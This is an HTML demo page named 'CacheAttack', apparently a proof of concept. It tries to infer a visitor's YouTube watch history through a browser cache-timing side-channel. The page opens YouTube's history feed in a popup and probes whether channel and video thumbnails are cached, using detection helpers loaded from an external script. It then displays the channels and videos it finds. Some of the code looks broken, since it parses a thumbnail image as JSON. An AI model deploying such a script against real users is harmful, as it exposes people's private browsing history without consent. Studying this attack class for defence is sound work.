<!DOCTYPE html>
<html>
<head>
<title>CacheAttack</title>
<meta name="keywords" content="html,css,javascript,cache">
<meta name="author" content="NDev">
<meta name="description" CONTENT="Time based attack">
<link rel="stylesheet" href="/main.css">
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
<link rel="icon" href="/favicon.ico" type="image/x-icon">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<script src="https://ndev.tk/mirror/HackTimer/HackTimer.min.js"></script>
<script src="https://cache.ndev.tk/embed.js"></script>
</head>
<body>
<nav class="navbar navbar-expand-sm bg-dark navbar-dark">
   <a class="navbar-brand" style="color:red">
      <img src="https://ndev.tk/icon.webp" class="d-inline-block align-top" alt="CacheAttack">CacheAttack</a>
  <ul class="navbar-nav">
    <li class="nav-item">
      <a class="nav-link" href="http://cache.ndev.tk">Main</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="http://cache.ndev.tk/network">Network</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="http://cache.ndev.tk/files">Files</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="http://cache.ndev.tk/Gender">Gender</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="https://github.com/NDevTK/CacheAttack/tree/master/Gender">Code</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="https://ndev.tk">HUB</a>
    </li>
  </ul>
</nav>
<div class="jumbotron">
<h1>Welcome to Youtube Detect</h1>
<p class="lead">Detects Youtube history</p>
<button onclick="getHistory()">Click!</button>
<br><h2 id="gender"></h2>
</body>
<script>
async function getHistory() {
	var ads = open("https://m.youtube.com/feed/history/?app=m");
	setTimeout(async _  => ads.close(), 1000);
	setTimeout(async _  => {
		var result = await getVideos();
	}, 1500);
}

function Video(id) {
	return "https://i.ytimg.com/vi_webp/"+id+"/mqdefault.webp";
}

async function addData(displayName) {
	alert(displayName);
}

async function getVideos() {
  checkedChannels = [];
  let r = await fetch("https://cache.ndev.tk/channels");
  channels = await r.json();
  YTCrawler(channels);
}

async function YTCrawler(channels) {
  for (var channel of channels) {
    if(checkedChannels.includes(channel[1])) continue;
    checkedChannels.push(channel[1]);
    let result = await ifCached(channel[1].concat("=s88-c-k-c0xffffffff-no-rj-mo"));
    if(!result) continue; // Channel not seen
    let r = await fetch("https://invidio.us/api/v1/channels/"+encodeURI(channel[0]));
    let channelData = await r.json();
    addData(channelData.author);
    channelData.latestVideos.forEach(async video => {
      let res = await fetch(Video(video.videoId));
      if(res.status !== 200) return;
      let board = await res.json();
      for (var url of board) {
        let result = await ifCached(url);
        let check = PerformanceCheck(url);
        if (check || result && check === null) {
          return addData(video.title + " ("+video.videoId+")");
        }
      }
      var relatedChannels = [];
      for (var relatedChannel of channelData.relatedChannels) {
        let url = relatedChannel.authorThumbnails[0].url.split("=")[0];
        relatedChannels.push([relatedChannel.authorId, url]);
      }
      await YTCrawler(relatedChannels);
    });
  }
}
</script>
